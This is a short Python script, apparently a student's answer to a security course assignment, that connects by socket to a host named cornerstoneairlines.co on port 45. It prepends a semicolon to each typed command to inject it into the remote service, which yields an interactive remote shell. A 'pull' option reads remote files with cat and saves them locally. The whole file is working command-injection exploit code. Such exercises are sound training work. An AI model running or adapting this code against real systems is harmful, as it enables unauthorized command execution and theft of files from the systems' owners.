"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import time

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here

def execute_cmd(cmd):
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    time.sleep(2)
    data = s.recv(1024)     # Receives 1024 bytes from IP/Port
    s.send((";" + cmd + "\n").encode())     # Send a newline \n at the end of your command
    time.sleep(2)
    data2 = (s.recv(1024)).decode()

    return data2


if __name__ == '__main__':
    s = input('>')

    while(s != "quit"):
        if(s == "shell"):
            s = input('/>')
            while(s != "exit"):
                print((execute_cmd(s)))
                s = input('/>')
        elif("pull" in s):
            words = s.split(" ")
            x = execute_cmd("cat " + words[1])
            f = open(words[2], "w")
            f.write(x)
            f.close
        else:
            print("You want to be able to conduct the following actions (by calling their respective commands) in this shell:\n1. shell Drop into an interactive shell and allow users to gracefully exit\n2. pull <remote-path> <local-path> Download files\n3. help Shows this help menu\n4. quit Quit the shell")

        s = input('>')
